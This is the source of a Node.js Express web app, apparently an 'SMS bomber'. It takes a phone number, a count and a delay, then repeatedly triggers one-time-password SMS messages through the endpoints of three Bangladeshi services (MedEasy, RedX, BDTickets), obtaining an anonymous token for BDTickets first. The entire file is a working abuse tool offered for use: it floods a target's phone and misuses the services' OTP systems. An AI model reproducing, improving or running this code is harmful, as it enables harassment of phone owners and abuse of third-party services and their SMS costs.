const express = require("express");
const app = express();
const PORT = process.env.PORT || 7860;

app.use(express.urlencoded({ extended: true }));

const https = require("https");

function sendMedEasy(phone) {
  const formatted = `+880${phone.slice(-10)}`;
  return new Promise((resolve) => {
    https.get(`https://api.medeasy.health/api/send-otp/${formatted}/`, { headers: { Accept: "application/json" } }, (res) => {
      let d = "";
      res.on("data", (c) => (d += c));
      res.on("end", () => resolve(res.statusCode >= 200 && res.statusCode < 300 ? "DONE" : `HTTP ${res.statusCode}`));
    }).on("error", (e) => resolve(e.message.split("\n")[0]));
  });
}

function sendRedX(phone) {
  return new Promise((resolve) => {
    const data = JSON.stringify({ phoneNumber: phone });
    const req = https.request("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": data.length },
    }, (res) => {
      let d = "";
      res.on("data", (c) => (d += c));
      res.on("end", () => resolve(res.statusCode >= 200 && res.statusCode < 300 ? "DONE" : `HTTP ${res.statusCode}`));
    });
    req.on("error", (e) => resolve(e.message.split("\n")[0]));
    req.write(data);
    req.end();
  });
}

function sendBDTickets(phone) {
  return (async () => {
    try {
      const deviceId = `${Date.now()}-${Math.random().toString(36).slice(2)}`;
      const body = JSON.stringify({ device_id: deviceId, device_type: "desktop" });
      const tokenRes = await fetch("https://apiv1.bdtickets.com/api/v1/auth/anonymous", { method: "POST", body, headers: { "Content-Type": "application/json" } });
      const token = (await tokenRes.json()).access_token || "";
      if (!token) return "no token";
      const otpRes = await fetch("https://apiv1.bdtickets.com/api/v1/auth/otp/send", { method: "POST", body: JSON.stringify({ phone: `+880${phone.slice(-10)}` }), headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json", "x-platform": "web", "x-channel": "direct" } });
      return otpRes.ok ? "DONE" : `HTTP ${otpRes.status}`;
    } catch (e) {
      return e.message.split("\n")[0];
    }
  })();
}

const sites = [
  { name: "MedEasy", fn: sendMedEasy },
  { name: "RedX", fn: sendRedX },
  { name: "BDTickets", fn: sendBDTickets },
];

async function run(phone, count, delay) {
  const withTimeout = (p, ms) => Promise.race([p, new Promise((_, r) => setTimeout(() => r("__TIMEOUT__"), ms))]);

  for (let i = 0; i < count; i++) {
    const results = await Promise.allSettled(
      sites.map((site) => withTimeout(site.fn(phone), 15000))
    );

    console.log(`[${i + 1}/${count}]`);
    for (let idx = 0; idx < results.length; idx++) {
      const r = results[idx];
      const name = sites[idx].name;
      let status, error;
      if (r.status === "fulfilled") {
        const v = r.value;
        status = v === "DONE" ? "DONE" : v.startsWith("HTTP") ? v : "FAILED";
        error = v !== "DONE" && !v.startsWith("HTTP") ? v : undefined;
      } else {
        status = "FAILED";
        error = r.reason === "__TIMEOUT__" ? "timed out" : String(r.reason).split("\n")[0];
      }
      console.log(`  [${name}] ${status}${error ? " - " + error : ""}`);
    }

    if (i < count - 1 && delay > 0) {
      console.log(`  Waiting ${delay}s ...`);
      await new Promise((r) => setTimeout(r, delay * 1000));
    }
  }
}

app.get("/", (req, res) => {
  res.send(`
    <html><body style="font-family:sans-serif;max-width:600px;margin:40px auto;text-align:center">
    <h1>SMS-Web OTP Sender</h1>
    <form method="POST">
      <label>Phone:</label><br>
      <input name="phone" placeholder="017XXXXXXXX" style="width:250px;padding:8px"><br><br>
      <label>Count:</label><br>
      <input name="count" value="1" style="width:60px;padding:8px"><br><br>
      <label>Delay (s):</label><br>
      <input name="delay" value="3" style="width:60px;padding:8px"><br><br>
      <button type="submit" style="padding:10px 30px;background:black;color:white;border:none;border-radius:6px;cursor:pointer">Run</button>
    </form>
    </body></html>
  `);
});

app.post("/", async (req, res) => {
  const phone = req.body.phone;
  const count = parseInt(req.body.count) || 1;
  const delay = parseInt(req.body.delay) || 3;
  if (!phone) return res.status(400).send("Phone required");

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.write(`<pre style="font-family:monospace;background:#f5f5f5;padding:20px;border-radius:8px">`);

  const origLog = console.log;
  console.log = (...args) => {
    const line = args.join(" ");
    res.write(line + "\n");
    origLog.apply(console, args);
  };

  try {
    await Promise.race([
      run(phone, count, delay),
      new Promise((_, r) => setTimeout(r, 120000, new Error("Global timeout"))),
    ]);
  } catch (e) {
    const err = "ERROR: " + e.message.split("\n")[0];
    res.write(err + "\n");
    origLog(err);
  }

  console.log = origLog;
  res.write(`</pre><br><a href="/">Back</a>`);
  res.end();
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
